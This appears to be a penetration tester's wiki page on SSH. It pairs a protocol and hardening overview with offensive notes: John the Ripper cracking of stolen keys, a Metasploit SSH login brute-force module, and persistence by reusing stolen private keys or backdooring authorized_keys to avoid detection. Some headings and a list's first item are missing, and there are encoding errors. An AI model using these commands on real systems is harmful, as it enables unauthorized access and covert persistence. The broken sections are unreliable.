## Index

* \[\[Ports, Protocols, and Services]]

## Secure Shell (SSH)

* **Port Number:** 22
* **Protocol:** TCP
* **Service Name:** Secure Shell (SSH)
* **Defined in:** RFC 4251, RFC 4252, RFC 4253, RFC 4254

SSH (Secure Shell) is a cryptographic network protocol used for secure communication between a client and a server. It provides a secure channel over an unsecured network by encrypting the data exchanged between the two entities. SSH is primarily used for remote login and command execution on networked devices, but it also supports tunneling, forwarding TCP ports, and transferring files.

### Overview of Features

* **Encryption:** SSH uses strong encryption algorithms to protect the confidentiality and integrity of data transmitted between the client and server.
* **Authentication:** Supports multiple authentication methods, including password-based, public key-based, and multi-factor authentication.
* **Port Forwarding:** SSH allows for the forwarding of TCP ports, enabling secure communication between applications that are not directly exposed to the internet.
* **Tunneling:** SSH can tunnel network traffic, providing a secure method to bypass firewalls and secure remote access.
* **SCP and SFTP:** SSH supports secure file transfer via the SCP (Secure Copy) and SFTP (SSH File Transfer Protocol) protocols.
* **Session Management:** SSH provides session management features such as session multiplexing, where multiple SSH sessions can be managed over a single TCP connection.
* **Compression:** SSH can compress the data it transmits, reducing the amount of bandwidth used.

### Typical Use Cases

* **Remote Administration:** SSH is widely used by system administrators to securely manage servers and network devices.
* **Secure File Transfer:** SCP and SFTP are used to securely transfer files between computers.
* **Secure Tunneling:** SSH is used to tunnel traffic securely between networks, providing access to internal services from remote locations.
* **Git Repositories:** Developers often use SSH to securely interact with Git repositories hosted on remote servers.
* **Automation:** SSH is frequently used in scripts to automate tasks on remote systems, particularly in the context of DevOps and CI/CD pipelines.

### How SSH Protocol Works

1. **Session Initialization:**
   * **Step 1:** The client initiates a TCP connection to the SSH server on port 22.
   * **Step 2:** The server responds with its SSH protocol version and software version. The client does the same.
   * **Step 3:** The server and client negotiate a set of encryption algorithms (ciphers), MAC (Message Authentication Code) algorithms, and compression methods to use for the session.
2. **Key Exchange:**
   * **Step 4:** The client and server perform a key exchange using the agreed-upon algorithm (e.g., Diffie-Hellman). This exchange securely establishes a shared secret key that will be used for encrypting the session.
   * **Step 5:** The server sends its public host key to the client. The client uses this key to verify the server's identity and to prevent man-in-the-middle attacks.
3. **Authentication:**
   * **Step 6:** The client initiates the authentication process. Depending on the configuration, this could involve password authentication, public key authentication, or a combination of methods.
   * **Step 7:** If using public key authentication, the client sends its public key to the server. The server checks this key against the list of authorized keys and, if found, challenges the client to prove possession of the corresponding private key.
   * **Step 8:** The client responds with the appropriate signature, proving its identity. If successful, the server grants access.
4. **Session Establishment:**
   * **Step 9:** Once authenticated, the client can initiate a session, requesting either a remote command execution, a terminal session, or file transfer. The session data is encrypted and secured using the previously established encryption methods.
5. **Data Transmission:**
   * **Step 10:** The client and server exchange data over the secure connection. This could include commands, responses, file transfers, etc.
   * **Step 11:** The data is encrypted, integrity-checked using MACs, and optionally compressed before transmission.
6. **Session Termination:**
   * **Step 12:** The client or server may terminate the session by sending an SSH\_MSG\_DISCONNECT message. The TCP connection is then closed.

   * **Exploitation:** Attackers can use tools like Hydra or Medusa to brute-force passwords, gaining access to the system.
   * **Mitigation:** Disable password authentication and root login. Use key-based authentication instead.
2. **Unrestricted Access:**
   * **Risk:** Not restricting which users can log in via SSH can lead to unauthorized access by lesser-privileged accounts.
   * **Exploitation:** Attackers might exploit vulnerabilities in software running under these accounts or escalate privileges.
   * **Mitigation:** Use the `AllowUsers` directive to restrict SSH access to specific users.
3. **Unmonitored SSH Access:**
   * **Risk:** Failing to monitor SSH access can lead to unnoticed breaches or malicious activity.
   * **Exploitation:** Attackers can maintain persistent access without detection.
   * **Mitigation:** Monitor SSH logs, use fail2ban to block suspicious IPs, and enable 2FA for added security.
4. **Improper Key Management:**
   * **Risk:** Mismanagement of SSH keys, such as leaving them unsecured or using weak passphrases, can lead to unauthorized access.
   * **Exploitation:** Stolen or weak keys can be used to gain access to the server.
   * **Mitigation:** Store keys securely, use strong passphrases, and regularly rotate keys.

### Default Credentials

SSH does not have "default" credentials per se, as it relies on the underlying systemâ€™s user accounts. However, if password authentication is enabled and weak or default passwords are used, this could lead to vulnerabilities.

    ```bash
    python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash-john

    john â€“wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash-john
    ```

#### Exploiting Weak Configurations

*   **Tool:** \[\[Metasploit]], \[\[Custom Scripts]]

    ```bash
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS <target_ip>
    set USERNAME <username>
    set PASS_FILE <password_list>
    run
    ```
* **Description:** Exploits weak SSH configurations, such as allowing root login or using weak ciphers.

### Persistence

#### Stealing Legitimate SSH Keys

*   **Tool:** \[\[SSH]]

    1. Create a file named `id_rsa` locally on Attack.

    ```bash
    vim id_rsa
    ```

    2. Copy contents of original `id_rsa` found on Target to `id_rsa` on Attack.

    ```bash
    echo "<target_id_rsa>" >> ~/id_rsa
    ```

    3. Change permissions of `id_rsa` on Attack.

    ```bash
    chmod 600 id_rsa
    ```

    Note: The command `chmod 600 id_rsa` is used on the key after it's been created on the machine to change the file's permissions to be more restrictive. If ssh keys have weak permissions, i.e., maybe read by other people, the ssh server may prevent them from working.

    4. **Connect:** Connect with `id_rsa` on Attack.

    ```bash
    ssh user@10.10.10.10 -i id_rsa
    ```
* **Description:** If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

#### Adding Malicious SSH Keys

*   **Tool:** \[\[SSH]]

    1. Create new key pair. This will give generate two files: `key` (which will be used with `ssh -i`) and `key.pub`, which we will be copied to the remote machine.

    ```bash
    ssh-keygen -f key
    ```

    2. Transfer `key.pub` to target.
    3. Add `key.pub` into `/root/.ssh/authorized_keys`. The remote server should allow the use of the newly added `key.pub` to log in as that user with the associated private key.

    ```bash
    echo "<attacker_public_key>" >> ~/.ssh/authorized_keys
    ```

    4. **Connect:** Connect with `id_rsa` on Attack.

    ```bash
    ssh user@10.10.10.10 -i id_rsa
    ```
*   **Description:** Inserts the attackerâ€™s public key into the `authorized_keys` file, allowing persistent access without needing a password.

    ```
       While you have access to the compromised host and we find ourselves with write access to a user's `/.ssh/` directory, it is typically a good idea to backdoor the SSH `authorized_keys` file which will allow for passwordless login at a point in the future. This should provide an easier and more reliable connection than exploiting and accessing via a reverse shell; and potentially reduce the risk of detection.

      Adding the key is simply a case of paste a SSH public key, generated on your attacking machine and pasting it into the `~/ssh/authorized_keys` file on the compromised machine. This technique is usually used to gain ssh access after gaining a shell as that user. Some SSH configurations may not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the `-f` flag to specify the output file.
    ```
